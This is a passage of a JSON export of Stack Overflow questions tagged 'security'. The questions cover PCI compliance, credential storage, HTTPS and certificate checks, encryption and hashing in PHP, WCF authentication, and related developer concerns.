I missing some well known security hole? I've read <a href=\"http://www.matasano.com/articles/javascript-cryptography/\" rel=\"nofollow\">this</a> which seems to address a different kind of security hole. I've also read a few other SO questions, but none of them seem to map clearly to this particular design.</p>\n\n<p>Edit #1: @Pointy asked why not use the industry standard. Major online retailers use solutions that are far more sophisticated and expensive than my problem warrants. Major retailers automatically process their transactions so typically work toward PCI-DSS compliance. This is not the problem that I'm trying to solve. I'm working on automatic tools to securely assist in manual transaction processing.</p>\n\n<p>Edit #2: @Jason Dean pointed out that I didn't describe the plan for managing the private key very well. The idea is literally to have our employee keep it on a piece of paper at their desk. Our main concern is with remote security violations. Our physical site is secure enough that we're not worried about someone breaking in. The idea would be to keep the private key out of any persistent storage on any machine anywhere that way no purely electronic attack could possibly get both the data and the private key.</p>\n"},{"tags":["sql-server","security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":36,"score":0,"question_id":13048885,"title":"Login failed for user 'my-PC\\my'","body":"<p>Why I have this error:</p>\n\n<p><b>  Cannot open database \"source\" requested by the login. The login failed.</p>\n\n<p>Login failed for user 'my-PC\\my' </b> ?.</p>\n\n<p>I use \"windows\" mode. From visual I can access data, but when I run it (asp project) I get an error.I get this eror when replaced database in project with modified version from Management Studio (I modified only stored procedure that's not invoking in project). I read some articles and in security option allowed 'my-PC\\my' all operations.No effect.</p>\n\n<p><b>EDIT:</b></p>\n\n<p>here is my connection string:</p>\n\n<pre><code>    \"Server=(local);Database=source;Integrated Security=SSPI;\"\n</code></pre>\n"},{"tags":["iphone","cocoa-touch","security","sdk","settings.bundle"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":2838,"score":5,"question_id":1248575,"title":"Security implications of storing a password in Settings.bundle and getting with CFPreferencesCopyAppValue","body":"<p>Apologies for the seeming obviousness of this question, but for whatever reason I haven't been able to find a definitive answer in the Apple documentation about where and how Settings.bundle password info is stored. My question: if I need to store some credentials for an app, and I use a Settings.bundle so that the password is entered into a PSTextFieldSpecifier textfield in Apple's Settings area with IsSecure = YES, and then I access the value from my app using CFPreferencesCopyAppValue, never writing it out to NSUserDefaults and only sending it over the network securely, how secure is that storage and retrieval method when compared to storing and retrieving the password using the keychain in my own app settings?  Thanks for your input.</p>\n"},{"tags":["php","mysql","security"],"answer_count":7,"favorite_count":8,"up_vote_count":11,"down_vote_count":0,"view_count":9332,"score":11,"question_id":3710511,"title":"Best way to connect to mysql with php securely","body":"<p>I want some input on what you guys think is the most secure way to connect to a mysql database using php. Currently the way Im doing it is a utility php file that I include in the top of all my other php files. The utility php file is this</p>\n\n<pre><code>&lt;?php\nif(!defined('IN_PHP')){\n    die(\"hackerssss\");\n}\n$mysql_host = \"localhost\";\n$mysql_user = \"root\"; \n$mysql_pass = \"root\"; \n$mysql_db = cokertrading;\n?&gt;\n</code></pre>\n\n<p>Any suggestions?</p>\n"},{"tags":["security","encryption","credit-card","pci-compliance"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":146,"score":1,"question_id":7128397,"title":"Is this set-up PCI-Compliant?","body":"<p>I've been debating with a client who refuses to adopt PCI standards.  I want to check with the community to make sure I'm correct in my objections.  </p>\n\n<p>Question:  Is there a way to store credit card information on a shared hosting server AND be PCI compliant?</p>\n\n<p>Here is the setup:</p>\n\n<p>1)  SSL is being implemented for the whole checkout process and for the client's site's admin section.</p>\n\n<p>2)  The credit card information is being stored on the server (a shared hosting plan) in a MYSQL database.  It is encrypted.</p>\n\n<p>3)  The client accesses a password protected admin panel and prints the credit card from her website.</p>\n\n<p>4)  The client then manually runs the credit card info through a terminal and deletes this credit card info from the server.</p>\n"},{"tags":["wordpress","security","pci-dss"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":10418655,"title":"WordPress Plugin and One-Way Encryption","body":"<p>I was hoping someone could help me sort something out. I've been working on a shopping cart plugin for WordPress for quite a while now.  I started coding it at the end of 2008 (and it's been one of those \"work on it when I have time\" projects, so the going is very slow, obviously!) and got pretty far with it.  Even had a few testers take me up on it and give me feedback. (Please note that this plugin is also meant to be a fee download - I have no intention of making it a premium plugin.)</p>\n\n<p>Anyway, in 2010, when all the PCI/DSS stuff became standard, I shelved it, because the plugin was meant to retain certain information in the database, and I was not 100% sure what qualified as \"sensitive data,\" and I didn't want to put anything out there that might compromise anyone, and possibly come back on me.</p>\n\n<p>Over the last few weeks, some colleagues and I have been having a discussion about PCI/DSS compliance, and it's sparked a re-interest in finally finishing this plugin.  I'm going to remove the storage of credit card numbers and any data of that nature, but I do like the idea of storing the names and shipping addresses of people who voluntarily might want to create an account with the site that might use this plugin so if they shop there again, that kind of info is retained. Keep in mind, the data stored would be <em>public information</em> - the kind of thing you'd find in a phone book, or a peek in the record room of a courthouse. So nothing like storing SS#'s, medical histories or credit card numbers. Just stuff that would maybe let someone see past purchases, and retain some info to make a future checkout process a bit easier.</p>\n\n<p>One of my colleagues suggested I still do something to enhance security a bit, since the name and shipping address would likely be passed to whatever payment gateway the site owner would choose to use. They suggested I use \"one-way encryption.\"  Now, I'm not a huge security freak, but I'm pretty sure this involves (one aspect anyway) stuff like MD5 hashes with salts, or the like.  So this confuses me, because I wouldn't have the slightest idea of where to look to see how to use that kind of thing with my code, and/or if it will work when passing that kind of data to PayPal or Google Checkout, or Mal's, or what have you.</p>\n\n<p>So I suppose this isn't an \"I need code examples\" kind of question, but more of a \"please enlighten me, because I'm sort of a dunce\" kind of question. (which, I'm sure, makes people feel much better about the fact that I'm writing a shopping cart plugin LOL)</p>\n"},{"tags":["security","https","pci-dss","pci-compliance"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12917137,"title":"PCI - Card Data Transmission","body":"<p>I understand that PCI compliance affects not just storage of card details but does it also affect transmission. E.g.  if I simply want to collect a card number and transmit it over https does this require PCI compliance steps to be taken?</p>\n"},{"tags":["php","security","encryption"],"answer_count":3,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":1056,"score":4,"question_id":10916284,"title":"How to encrypt/decrypt data in php?","body":"<p>I'm currently a student and I'm studying PHP, I'm trying to make a simple encrypt/decrypt of data in PHP. I made some online research and some of them were quite confusing(at least for me).</p>\n\n<p>Here's what I'm trying to do:</p>\n\n<p>I have a table consists of these fields (UserID,Fname,Lname,Email,Password)</p>\n\n<p>What I want to have is have the all fields encrypted and then be decrypted(Is it possible to use sha256 for encryption/decryption, if not any encryption algorithm)</p>\n\n<p>Another thing I want to learn is how to create a one way hash(sha256) combined with a good \"salt\".\n(Basically I just want to have a simple implementation of encryption/decryption, hash(sha256)+salt)</p>\n\n<p>Sir/Ma'am, your answers would be of great help and be very much appreciated. Thank you++</p>\n"},{"tags":["c++","windows","security","winapi","kernel"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":68,"score":2,"question_id":13044991,"title":"Get all Windows Kernel object and Security rights of it","body":"<p>I need to get list of access rights to all Win-Kernel objects;\nWhat I do:</p>\n\n<pre><code>for (int i=0; i&lt;9999; i++)\n    GetKernelObjectSecurity( i, ... ) //result in security_descriptor\n    GetSecurityDescriptorDacl( security_descriptor, ... ) // result in lpbDaclPresent\n    if (lpbDaclPresent)\n        //lpbDaclPresent - need to get\n</code></pre>\n\n<blockquote>\n  <p>If DACL = Null -> \"all can do all\"</p>\n  \n  <p>If DACL != Null -> parsing DACL-mask</p>\n</blockquote>\n\n<hr>\n\n<p>I'm on the right track ?\nBy the way, I have: </p>\n\n<p>~300 handles without DACL</p>\n\n<p>~100 handles with DACL\n(testing on Windows 7)</p>\n"},{"tags":["mysql","performance","perl","security","cgi"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":13043648,"title":"Perl: Handing $dbh off to module. Security and performance?","body":"<p>So I have a cgi script,</p>\n\n<pre><code>#!/usr/bin/perl -T\n\nuse strict;\nuse warnings;\nuse DBI;\nuse WebEngine;\n\n\nmy $dbh = DBI-&gt;connect('DBI:mysql:database', $username, $password)\n    || die \"Could not connect to database: $DBI::errstr\";\n\nmy $we = WebEngine-&gt;new($dbh)\n    or die(\"Failed to instantiate WebEngine object:\\n$!\\n\");\n\n$userID = $we-&gt;register(\"MyUsername\", $dbh);\n</code></pre>\n\n<p>This script creates a database handler and then uses a module I made to deal with most of the back-end of the site to register a username and return a userID number.</p>\n\n<p>I have three questions about this.</p>\n\n<ul>\n<li><p>Does creating this $dbh in this script increase performance by keeping a database connection open?  </p></li>\n<li><p>Could I put the $dbh in my module and not fear being inefficient? </p></li>\n<li><p>Is there a security benefit to keeping the $dbh (and the associated info(I keep my pass in plain text in the code; is that bad?)) in the module that is not directly interacted with through my website?</p></li>\n</ul>\n"},{"tags":["security","amazon-s3","spring-security","storage"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13043572,"title":"Is there a way to integrate the S3's ACL with my own user repository?","body":"<p>I am writing a java ee application, with its own users and roles repository (based on the Spring Security Framework). In the application, some users upload large files. </p>\n\n<p>I want these files to be protected (i.e. only the person who uploaded the file should have the right to access it; in fact the authorization logic is a bit more complex than that). My users don't have any aws account.</p>\n\n<p>I would like to store these files on S3, but I haven't found a way to do it securely. Indeed, I haven't found a way to express an ACL that would reference my users and roles. </p>\n\n<p>I have thought about generating opaque names for my files (that would be hard to guess). My java ee application could ensure that access to the web page that contains a link to the file is protected. Some level of protection, but it seems pretty fragile against a brute force attachk.</p>\n\n<p>Any idea?</p>\n"},{"tags":["security","email","proxy","exchange","fraud"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13042060,"title":"How can I set up a service that proxies/substitutes users' emails?","body":"<p>Hoping someone can help me out with a security issue that's puzzling me. I have a webapp (in C#) that sends users email notifications when they contact or interract with each other in the app.</p>\n\n<p>The problem is that the notifications include both parties' personal emails as the to/from fields. I don't want to remove this functionality because users expect to be able to reply by just sending a reply email, but I'm worried about exposing personal details like that.</p>\n\n<p>Ideally, I'd like something like Facebook messages, Twitter DMs or eBay messages, where personal emails are cloaked, and any email replies forwarded.</p>\n\n<p>Would anyone know how to create something like this? Is there something simpler and more scalable than an email server with a whole heap of forwarding rules?</p>\n\n<p>Any help would be insanely appreciated.</p>\n"},{"tags":["php","security","guide"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":1,"view_count":48,"score":2,"question_id":13041294,"title":"Guide to security testing","body":"<p>I am looking for some helpful books/tutorials <strong>step-by-step</strong> guide for security testing without web testing tools (<a href=\"http://seleniumhq.org/\" rel=\"nofollow\">Selenium</a> <a href=\"/questions/tagged/php\" class=\"post-tag\" title=\"show questions tagged 'php'\" rel=\"tag\">php</a>, <a href=\"http://watir.com/\" rel=\"nofollow\">Watir</a> <a href=\"/questions/tagged/ruby\" class=\"post-tag\" title=\"show questions tagged 'ruby'\" rel=\"tag\">ruby</a>)</p>\n\n<p>As a newbie, I am particular interested in:</p>\n\n<ul>\n<li>Authentication / Authorization</li>\n<li>Business Logic</li>\n<li>Session / Cookie</li>\n<li>SQL Injection</li>\n</ul>\n\n<p>Any tips/tricks/rants would be awesome.</p>\n"},{"tags":["ios","security","ssl","keychain"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":140,"score":0,"question_id":12305947,"title":"SecItemCopyMatching returns more SecIdentityRef items than were added using SecItemAdd","body":"<p>I am implementing SSL client authentication for our iPhone app and am using the app keychain to store the client identity (certificate + private key).  After adding the items to the keychain, I am getting some unexpected results when using SecItemCopyMatching.  Quick summary:  I add exactly one SecIdentityRef to the keychain, but SecItemCopyMatching finds two afterwards.  Let me start with the facts.</p>\n\n<p>I am running my app on an iPod with iOS 4.3.5.</p>\n\n<p>I have an empty app keychain to start with.</p>\n\n<p>My certificates are all created using openssl and deployed to the iPod via a PKCS#12 file as an email attachment.\nThe PKCS#12 file contains:</p>\n\n<ul>\n<li>Client certificate</li>\n<li>Client CA certificate (issuer of the Client certificate)</li>\n<li>Root CA certificate (issuer of the Client CA certificate)</li>\n<li>RSA private key of the client certificate</li>\n</ul>\n\n<p>SecPKCS12Import successfully imports the file and the resulting dictionary has the following content:</p>\n\n<ul>\n<li>one \"identity\"</li>\n<li>one \"trust\"</li>\n<li>one \"chain\" (CFArray which holds the three certificates mentioned above)</li>\n</ul>\n\n<p>Using SecItemAdd, I successfully add the \"identity\" to the keychain.</p>\n\n<p>Next, I retrieve the \"chain\" array from the dictionary and attempt to add the certificates.  In doing so, the first one fails with error errSecDuplicateItem.  I assume this is because the first certificate is the client certificate and that it was already added to the keychain when I added the identity.  The other two certificates are added without error.</p>\n\n<p>Now, if I go back and use SecItemCopyMatching with these key/value pairs...</p>\n\n<pre><code> keys   = {kSecClass, kSecReturnRef, kSecMatchLimit}\n values = {kSecClassIdentity, kCFBooleanTrue, kSecMatchLimitAll}\n</code></pre>\n\n<p>...two identities are returned!  Furthermore, if I retrieve the certificate for each (SecIdentityCopyCertificate) and then the summary (SecCertificateCopySubjectSummary), I see the both identities have the same certificate!</p>\n\n<p>Lastly, when I try to clear the identities from the keychain (SecItemDelete), the first attempt is successful but the second fails with errSecItemNotFound.</p>\n\n<p>It is clear from all the googling I have been doing that there are \"issues\" with the iOS keychain.  However, I have not seen this reported; nor have I seen anything even remotely related.  </p>\n\n<p>So, my questions:</p>\n\n<ul>\n<li>Am I using SecItemCopyMatching correctly?</li>\n<li>When using SecItemCopyMatching to find identities in the keychain, how does it determine the identities that are present?  Is this dynamic, or strictly based on how many SecIdentityRef items were added?</li>\n<li>could this problem possibly be related to the certificates themselves?  Note that despite this issue, I am still able to retrieve the first identity and certificates in order to respond to didReceiveAuthenticationChallenge.</li>\n</ul>\n\n<p>I can post code and/or certificate dump, if needed.</p>\n\n<p>Thanks in advance,</p>\n\n<p>Ken Cross\nSiemens Enterprise Networks.</p>\n"},{"tags":["asp.net","performance","security","https","asp.net-mvc-4"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13040442,"title":"implications of having a site in full https","body":"<p>I am currently developing an MVC4 web application for eCommerce. The site will contain a login and users can visit the site, input their details and submit orders etc. This is a traditional eCommerce site.</p>\n\n<p>To boost the security of the site, I am looking to set up the entire site in https. As the user will be supplying their log in credentials and storing personal information in cookies, I would like the site to be fully secured. </p>\n\n<p>I have concerns though, these being if I set up the site in https, will it detriment performance? Will it impact negatively on search engine optimization? Are there any other implications of having an entire site in https?</p>\n\n<p>I use output caching to cache the content of my views - with https will these still get cached?</p>\n\n<p>I have been reviewing security guidelines and documentation, such as <a href=\"http://asafaweb.com/OWASP%20Top%2010%20for%20.NET%20developers.pdf\" rel=\"nofollow\">this</a> from OWASP and they recommend this. Also, I see that sites such as twitter are fully https.</p>\n"},{"tags":["linux","security","networking","ip"],"answer_count":2,"favorite_count":1,"up_vote_count":9,"down_vote_count":0,"view_count":461,"score":9,"question_id":4071426,"title":"How to set the Evil Bit on outgoing traffic","body":"<p>So for a security related application I'm writing, I actually want to use RFC3514 (\"The Evil Bit\") to determine what set of traffic across the network is evil or not at a per packet level. This is used as training data for an assisted machine learning engine, so the app has to know before hand what packets are evil and which are not. </p>\n\n<p>This ought to be fairly simple, it's just setting a single IP layer bit. I've tried looking into doing this with iptables or libpcap, but either they don't have the functionality or I failed to discover it. </p>\n\n<p>Being able to set it for all traffic out of a machine would be fine, but filters on what comes out would be better. (Like being able to specify what higher layer protocols get it set, etc...) </p>\n\n<p>I'm using Ubuntu, as well. So Linux solutions preferred. But otherwise, it doesn't really matter what method is used to accomplish this. Bash script, c/c++ app, setting some sysctl, whatever.</p>\n"},{"tags":["flash","security","flash-player","twilio"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":211,"score":0,"question_id":9824982,"title":"Flash player security settings","body":"<p>I am using twilo client in one of my apps and it is showing following popup when I click on call button\n<img src=\"http://i.stack.imgur.com/sFcZV.png\" alt=\"Flash Security settings\"></p>\n\n<p>But I want to show the following pop up which is lot simpler and seems less cumbersome\n<img src=\"http://i.imgur.com/grvcb.png\" alt=\"Flash Security settings\"></p>\n\n<p>Is there a way to control which pop up comes on the screen? I have read some documentation of adobe but their configuration files live in users computer which ofcourse can not be changed by a website.\nAny help will be really appreciated</p>\n"},{"tags":["ipad","security"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12977959,"title":"authenticating ipad against active directory","body":"<p>I have made an ipad app in which I want to implement a log in using active directory authenticaion. so far, i have not found anything on how to do this. I want to use the ipad's mac id to authenticate against the active directory. How can I implement this, or is there any other way I can implement a security log in to my app</p>\n"},{"tags":["asp.net","security","cryptography","ssl-certificate","wif"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":13025223,"title":"Access to private key of SSL cert","body":"<p>Is it okay to give Network Service access to the site's SSL certificates private key from a security point of view?</p>\n\n<p>EDIT: adding some context to the question\nIn this <a href=\"http://msdn.microsoft.com/en-us/library/windowsazure/hh289318.aspx\" rel=\"nofollow\">link</a>, under section \"Encrypt cookies using RSA\" step 4, the code uses the  \"serviceCertificate\" to encrypt and sign the cookie. Access to the cert's private key is required here.</p>\n"},{"tags":["php","image","security","file-upload","virus"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":22,"score":2,"question_id":13039565,"title":"Sanitazing user uploaded (image) files for malicious / harmful content","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/10196351/image-sanitization-library\">Image sanitization library</a>  </p>\n</blockquote>\n\n\n\n<p>How can a social web application that allows user file uploads, prevent harmful content hidden/stored in user files. I use php as a server side technology for a site. Users can upload images. Is there a way that the contents of these files can be verified via php? The images may also be downloaded by the owner and other users.</p>\n"},{"tags":["wcf","security","mvc"],"answer_count":0,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":13038646,"title":"WCF as BLL (Middle Tier) and Security techniques","body":"<p>So bear with me, i am new at MVC and WCF. I already have a set of services (WCF) that exposes my BLL and I am trying to consume those from my MVC.net web application but i am unsure on how to perform security operations here.</p>\n\n<p>These are my app requirements:</p>\n\n<ul>\n<li>Be able to consume WCF services using different credentials for every user on the web application</li>\n<li>My BLL (WCF) needs to know what consumer is calling it (right now I only have the MVC app but i am planning to add iOS and Andriod calls to it, so later on i will add REST services to the WCF endpoints) Is there any design pattern for this out there? (or should i just use the soap header to include the caller ID? should i use some sort of caller secret or something?)</li>\n<li>I need a security mechanism like Tokens or something so I dont have to pass the username and password on every call of the service method (WCF)</li>\n</ul>\n\n<p>What i have so far:</p>\n\n<ul>\n<li>WCF uses a certificate and  and   with a custom username validator.</li>\n<li>I have manually coded proxies using the contract interfaces instead of generated proxies: But I hate the fact that i have to validate username and password every time a call is made to a WCF service. How in heaven can i use Tokens here? like to know if a given token sent on the soap header is valid or not yet expired? i have searched a lot and no tutorial/code/example is clear enough for me to actually start coding that ;(</li>\n<li>I am trying to cache the ChannelFactory but should I? i mean, i will need to cache a channer factory per logged in user per contract ;( is that ok? what can i do here?</li>\n</ul>\n\n<p>Thanks in advance!</p>\n"},{"tags":["security","rest","oauth","resteasy"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":12904152,"title":"Resteasy security, oauth, android Client","body":"<p>I'm building an application which includes both server side components (resteasy) and an Android client.  In the Android client I'm making requests to the server using httpclient.</p>\n\n<p>To log into Android client I want to use OAuth 2.0. </p>\n\n<p>But what I'm the most concerned about is securing the server side.  Does anyone know how to secure the server side of my application?</p>\n"},{"tags":["security","ssl","https","certificate"],"answer_count":6,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1030,"score":2,"question_id":138705,"title":"Security implications of disabling the Common Name check for HTTPS","body":"<p>I'm going over some client code I've inherited for doing secure communication over HTTPS, and it seems that it's not checking the common name in the server certificate (eg. 'CN = \"example.com\"' against the actual URL that's being requested. This is probably deliberate, since our client app is required to talk to various environments, so after contacting an initial portal (eg. example.com/main) and the user choosing an environment the app gets redirected to a specific IP, so all future requests look something like \"http://127.0.0.1/page\".</p>\n\n<p>However being an SSL newbie, I'm unsure of the implications of disabling this check. My first reaction would be that it'd be easier to perform some kind of man-in-the-middle attack, since someone else could just copy our certificate and pretend to be one of our servers. But if we were doing common name checking you'd be able to do the same thing with custom DNS settings anyway, so it doesn't seem to actually gain us anything. Are there other attacks that this leaves us open to which we wouldn't be otherwise?</p>\n\n<p>Thanks</p>\n"},{"tags":["security","video-streaming","html5-video","cdn","mediaelement.js"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":13036226,"title":"MediaElement.js: Source URL with Variables?","body":"<p>After falling in love with MediaElement.js, I ran into a problem. On the site in question we use Bitgravity as our CDN. Bitgravity uses an MD5 hash to secure video URLs, added to the end as a variable. For example:</p>\n\n<pre><code>    http://stuff.blah.cdn.bitg.net/Secure/stuff/myvideo.mp4?h=3440203940902383938298394833324323\n</code></pre>\n\n<p>The result was MEj's \"Download File\" link, pointing to the page the code is on. After fooling around a bit, I found that the presence of a variable on the URL is triggering the problem.</p>\n\n<p>Does anyone know of a way to make MediaElements.js accept a source URL with a variable such as this?</p>\n"},{"tags":["linux","security","ubuntu","random","entropy"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":82,"score":2,"question_id":13017023,"title":"How can I exhaust /dev/urandom for testing?","body":"<p>I recently had a bug where I didn't properly handle when the entropy on my linux server got too low and a read of /dev/urandom returned less than the number of bytes expected.</p>\n\n<p>How can I recreate this with a test?  Is there a way to lower the entropy on a system or to reliably empty /dev/urandom?</p>\n\n<p>I'd like to be able to have a regression test that will verify my fix.  I'm using Ubuntu 12.04.</p>\n"},{"tags":["php","security","encoding","utf-8","mbstring"],"answer_count":2,"favorite_count":4,"up_vote_count":13,"down_vote_count":0,"view_count":106,"score":13,"question_id":13022369,"title":"PHP Security: how can encoding be misused?","body":"<p>From this excellent \"<a href=\"http://stackoverflow.com/questions/279170/utf-8-all-the-way-through\">UTF-8 all the way through</a>\" question, I read about this:</p>\n\n<blockquote>\n  <p>Unfortunately, you should verify every submitted string as being valid\n  UTF-8 before you try to store it or use it anywhere. PHP's\n  mb_check_encoding() does the trick, but you have to use it\n  religiously. There's really no way around this, <strong>as malicious clients</strong>\n   <strong>can submit data in whatever encoding they want</strong>, and I haven't found a\n  trick to get PHP to do this for you reliably.</p>\n</blockquote>\n\n<p>Now, I'm still learning the quirks of encoding, and I'd like to know exactly what malicious clients can do to abuse encoding. What can one achieve? Can somebody give an example? Let's say I save the user input into a MySQL database, or I send it through e-mail, how can a user create harm if I do not use the <code>mb_check_encoding</code> functionality? </p>\n"},{"tags":["security","windows-integrated-authe","windows-integrated-authen"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13015793,"title":"Will Integrated Windows Authentication ever fall back to plain text username & password?","body":"<p>I'm trying to learn more about Integrated Windows Authentication but everything I read introduces me to three new acronyms, many of which incorporate other acronyms, and I don't feel I know anything about the mechanics.</p>\n\n<p>I understand that if an HTTP client doesn't support Integrated Windows Authentication there is a chain of fallbacks that can identify the client and might involve prompting for a username and password. Is there ever a case where it will fallback to HTTP Basic Authentication or any other plain text username / password communication?</p>\n\n<p>I'm trying to determine if I need to provide SSL to protect user credentials and I'm hoping that all authentication is secured in some way.</p>\n"},{"tags":["c#","asp.net","security","authentication","ssl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13033540,"title":"client certificate authentication in https using X509Certificate2","body":"<p>I am trying to understand how does client authentication work in https scenario and how to use it to provide a basic authentication/authorization capability.</p>\n\n<p>Let's say I want to have a mapping between a certificate and a user (eg. IPrincipal). My server issues certs and distributes them to the clients. When client connects I ask for certificate and if a valid certificate has been provided I authenticate the user based on the mapping defined earlier. </p>\n\n<p>What should I use to create the mapping? Is cert thumbprint a good candidate? Is it enough to determine client identity?</p>\n\n<p>Or maybe I don't need the mapping at all and can simply accept all certs issued by my server ?</p>\n\n<p>Edit: Let me rephrase it - assuming that I can issue client certificates, how do I verify clients identity during https session?</p>\n"},{"tags":["security","authentication","tomcat","war"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":10212207,"title":"Tomcat authentication configured inside the war","body":"<p>I have to deploy a war to a tomcat but I cannot modify anything outside the war itself.\nNow I need to add authentication and authorization to the application.</p>\n\n<p>The basic authentication would be enough but I cannot edit the tomcat-user.xml file, nor I can depend on absoulute paths as suggestend here: <a href=\"http://stackoverflow.com/questions/7726014/how-do-i-provide-basic-http-authentication-for-static-tomcat-webapps-without-cha\">How do I provide basic http authentication for static tomcat webapps without changing tomcat-users.xml?</a></p>\n\n<p>I just need to use a single user/password that can be configured in a file inside the war (it's a simple application with short lifetime and really low security requirements).\nWhat is the simplest way to do this?</p>\n\n<p>Thanks\nAndrea</p>\n"},{"tags":["asp.net-mvc","security","asp.net-web-api","wif",".net-4.5"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12936315,"title":"How to Make Sure My Custom ClaimsPrincipal Sticks Around In ASP.NET MVC 4","body":"<p>I am creating a custom <strong><em>ClaimsPrincipal</em></strong> that has additional claims using a custom <strong><em>AuthenticationManager</em></strong>.  It appears that in ASP.NET 4.5 the <strong><em>AuthenticationManager</em></strong> is not automatically invoked and you have to manually invoke it. I have seen posts that suggest you do this in the <strong><em>PostAuthenticateRequest</em></strong>. My code looks like this in the Global.asax:</p>\n\n<pre><code>protected void Application_OnPostAuthenticateRequest(object sender, EventArgs e)\n{\n    System.Web.HttpContext.Current.User =\n        FederatedAuthentication.FederationConfiguration.IdentityConfiguration.ClaimsAuthenticationManager.Authenticate(\"none\",\n            System.Web.HttpContext.Current.User as ClaimsPrincipal);\n}\n</code></pre>\n\n<p>I am using Forms Authentication with cookies.  The current principal gets set correctly when the PostAuthenticateRequest is fired. The problem is that when the next request comes in to the ASP.NET Web API the custom claims are lost. I am using Web API for AJAX requests in a single page application (SPA). I suspect that what is in the current ClaimsPrincipal is being overwritten by what is in the cookie, but I am not sure. I am not using an inherited ClaimsPrincipal for type-safe retrieval of custom claims. I am just adding new claims which are subsequently lost somewhere in the process. What is the proper way to setup a custom ClaimsPrincipal so the additional claims are not loss between requests.</p>\n"},{"tags":["java","security","jvm","weblogic"],"answer_count":2,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":1999,"score":6,"question_id":4521119,"title":"Java argument to specify Java.Security file for JVM","body":"<p>I'm looking for a java argument (or perhaps some different method) to allow me to specify a file to be used by the JVM as the java.security file, rather than using the one found in the JDK (in the JRE lib).</p>\n\n<p>To give you a little more context, I am working with a WebLogic server that was set up by someone else and is running two (or more) different JVMs off the same JDK. We have run into an issue now where the work I'm doing on one JVM requires a different java.security file than the one that is currently being used by the other JVM. I am hoping there will be a way for me to just point my JVM at a new java.security file without having to point it at an entirely new JDK (due to space constraints, we would like to avoid uploading a JDK specific to each JVM).</p>\n\n<p>I realize that the server's set up is not ideal, but completely rearranging the existing set up is not viable and not something I am in a position to do. So, I am hoping someone might have a creative solution that would allow for multiple JVMs running off the same JDK but with different security configurations.</p>\n\n<p>I have been trying to find solutions out there, but it seems my Google-Foo is not as strong as I had hoped. Here's to hoping one of you has the answer!</p>\n\n<p>Many thanks.</p>\n\n<p><strong>EDIT</strong><br>\nSorry maybe my  original post was not clear, but I am interested in specifying the java.security file, also often referred to as the <em>Java master security properties file</em>, not the java.policy file which is found in the same directory.</p>\n\n<p><strong>My Solution</strong></p>\n\n<p>I will post my solution here just for reference of others who might fall into a similar situation.</p>\n\n<p>As I can't seem to find an argument to specify at start up, I have decided that I will have to forgo the java.security properties file. It is possible to set properties and providers (typically configured in the file) within code using the Security class (java.security.Security). So, at least in the interim, I plan to write a class that will go through setting up my JVM specific security configurations after startup (essentially overwriting the default configurations provided by the file for the other JVM). While the obvious downside of this solution is that is does not externalize security configurations of this JVM, the solution does provide me a way to set JVM specific properties and providers without affecting the configuration of other JVMs running off the same JDK.</p>\n\n<p>I appreciate the time and consideration given by others. Thanks =) </p>\n"},{"tags":[".net","asp.net","security","cryptography"],"answer_count":4,"favorite_count":5,"up_vote_count":12,"down_vote_count":0,"view_count":2061,"score":12,"question_id":3681493,"title":"Leveraging ASP.NET machineKey For Encrypting My Own Data","body":"<p>I have some data I want to encrypt in an ASP.NET MVC application to prevent users from tampering with it.  I can use the Cryptography classes to do the actual encryption/decryption, no problem there.  The main problem is figuring out where to store the encryption key and managing changes to it.</p>\n\n<p>Since ASP.NET already maintains a machineKey for various things (ViewData encryption, etc), I was wondering if there were any ASP.NET functions which let me encrypt/decrypt my own data using the machineKey?  This way I would not have to devise my own key management system.</p>\n"},{"tags":["java","spring","security","xss","apache-stringutils"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":11718451,"title":"Selective HTML escaping with Java","body":"<p>Is there anything in <code>JavaSE</code>, <code>Spring</code> or <code>Apache Commons StringUtils</code> that would allow me to strip out HTML from a String but also supply a whitelist of HTML entities that I would like to 